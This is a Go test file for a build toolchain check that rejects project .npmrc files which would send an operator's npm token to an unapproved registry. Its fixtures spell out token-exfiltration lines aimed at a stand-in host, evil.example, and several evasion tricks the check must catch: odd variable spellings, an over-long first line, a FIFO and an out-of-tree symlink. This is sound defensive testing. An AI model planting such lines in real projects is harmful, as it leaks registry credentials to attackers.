package toolchain

import (
	"os"
	"path/filepath"
	"strings"
	"syscall"
	"testing"
	"time"
)

func writeNPMRC(t *testing.T, body string) string {
	t.Helper()
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, ".npmrc"), []byte(body), 0o600); err != nil {
		t.Fatal(err)
	}
	return dir
}

// The operator's token goes only where the operator pointed it. A committed
// .npmrc may wire the org's own mirror — the common, legitimate shape — and may
// not send the same variable anywhere else.
func TestProjectNPMRCMaySendTheOperatorsTokenOnlyToTheOperatorsRegistries(t *testing.T) {
	operator := map[string]string{
		"NPM_TOKEN":           "secret",
		"npm_config_registry": "https://registry.corp.example/npm/",
	}

	for _, tc := range []struct {
		name, npmrc string
		refused     bool
	}{
		{"no expansion at all", "legacy-peer-deps=true\n", false},
		{"the org's own mirror", "//registry.corp.example/npm/:_authToken=${NPM_TOKEN}\n", false},
		{"the public registry", "//registry.npmjs.org/:_authToken=${NPM_TOKEN}\n", false},
		{"an unscoped credential follows the operator's registry", "registry=https://evil.example/\n_authToken=${NPM_TOKEN}\n", false},
		{"a host the operator never named", "//evil.example/:_authToken=${NPM_TOKEN}\n", true},
		{"a scoped registry pointing elsewhere", "@acme:registry=https://evil.example/\n//evil.example/:_authToken=${NPM_TOKEN}\n", true},
		{"the optional-expansion spelling", "//evil.example/:_authToken=${NPM_TOKEN?}\n", true},
		{"the app's own variable goes where the app likes", "//evil.example/:_authToken=${APP_OWN_TOKEN}\n", false},
		{"a commented-out line", "# //evil.example/:_authToken=${NPM_TOKEN}\n", false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			err := checkProjectNPMRC(writeNPMRC(t, tc.npmrc), operator)
			if tc.refused && err == nil {
				t.Fatal("accepted")
			}
			if !tc.refused && err != nil {
				t.Fatalf("refused: %v", err)
			}
			if err != nil && !strings.Contains(err.Error(), "evil.example") {
				t.Errorf("the refusal does not name the host: %v", err)
			}
		})
	}
}

// With no operator registry, the project's own registry= is where an unscoped
// credential goes — so an unscoped token there is the redirect.
func TestAnUnscopedTokenFollowsTheProjectRegistryWhenTheOperatorNamedNone(t *testing.T) {
	operator := map[string]string{"NPM_TOKEN": "secret"}
	if err := checkProjectNPMRC(writeNPMRC(t, "registry=https://evil.example/\n_authToken=${NPM_TOKEN}\n"), operator); err == nil {
		t.Fatal("an unscoped token aimed at the project's own registry was accepted")
	}
	if err := checkProjectNPMRC(writeNPMRC(t, "_authToken=${NPM_TOKEN}\n"), operator); err != nil {
		t.Fatalf("an unscoped token for the public registry: %v", err)
	}
}

func TestNoProjectNPMRCIsFine(t *testing.T) {
	if err := checkProjectNPMRC(t.TempDir(), map[string]string{"NPM_TOKEN": "x"}); err != nil {
		t.Fatal(err)
	}
}

// npm expands ${VAR} in every value, so an operator variable outside a
// credential key — in registry=, a scoped registry, or a proxy's userinfo —
// carries the token to whatever host that setting names. It is refused; the
// app's own variables still are not checked.
func TestAnOperatorVariableOutsideACredentialKeyIsRefused(t *testing.T) {
	operator := map[string]string{"NPM_TOKEN": "secret"}
	for _, npmrc := range []string{
		"registry=https://evil.example/${NPM_TOKEN}/\n",
		"@acme:registry=https://evil.example/${NPM_TOKEN}/\n",
		"https-proxy=https://x:${NPM_TOKEN}@evil.example/\n",
		"proxy=http://x:${NPM_TOKEN?}@evil.example/\n",
	} {
		err := checkProjectNPMRC(writeNPMRC(t, npmrc), operator)
		if err == nil || !strings.Contains(err.Error(), "NPM_TOKEN") {
			t.Errorf("%q: err = %v, want refused naming NPM_TOKEN", npmrc, err)
		}
	}
	if err := checkProjectNPMRC(writeNPMRC(t, "registry=https://${APP_HOST}/\n"), operator); err != nil {
		t.Errorf("the app's own variable was refused: %v", err)
	}
}

// LB-4 (security review 2026-11-15): the check read .npmrc with a blocking,
// link-following open, so a FIFO there parked a repair under the cache lock. It
// reads inside the tree, non-blocking, regular files only — and anything else
// is a refusal, because npm may read what the check could not.
func TestAnNPMRCThatIsNotARegularFileInTheTreeIsRefused(t *testing.T) {
	operator := map[string]string{"NPM_TOKEN": "secret"}

	fifo := t.TempDir()
	if err := syscall.Mkfifo(filepath.Join(fifo, ".npmrc"), 0o600); err != nil {
		t.Skipf("mkfifo: %v", err)
	}
	done := make(chan error, 1)
	go func() { done <- checkProjectNPMRC(fifo, operator) }()
	select {
	case err := <-done:
		if err == nil {
			t.Error("a FIFO .npmrc was accepted")
		}
	case <-time.After(time.Second):
		t.Fatal("the check blocked on a FIFO .npmrc")
	}

	outside := writeNPMRC(t, "//evil.example/:_authToken=${NPM_TOKEN}\n")
	link := t.TempDir()
	if err := os.Symlink(filepath.Join(outside, ".npmrc"), filepath.Join(link, ".npmrc")); err != nil {
		t.Fatal(err)
	}
	if err := checkProjectNPMRC(link, operator); err == nil {
		t.Error("a .npmrc linking out of the tree was accepted")
	}
}

// A first line past bufio.Scanner's 64 KiB ended the check with nil; and
// `${${NPM_TOKEN}` is the `${NPM_TOKEN}` npm expands.
func TestTheNPMRCCheckReadsEveryLineAsNPMDoes(t *testing.T) {
	operator := map[string]string{"NPM_TOKEN": "secret"}
	long := "#" + strings.Repeat("x", 70<<10) + "\nregistry=https://evil.example/${NPM_TOKEN}/\n"
	if err := checkProjectNPMRC(writeNPMRC(t, long), operator); err == nil {
		t.Error("a token after a 70 KiB line was accepted")
	}
	if err := checkProjectNPMRC(writeNPMRC(t, "//evil.example/:_authToken=${${NPM_TOKEN}\n"), operator); err == nil {
		t.Error("${${NPM_TOKEN} was accepted")
	}
}
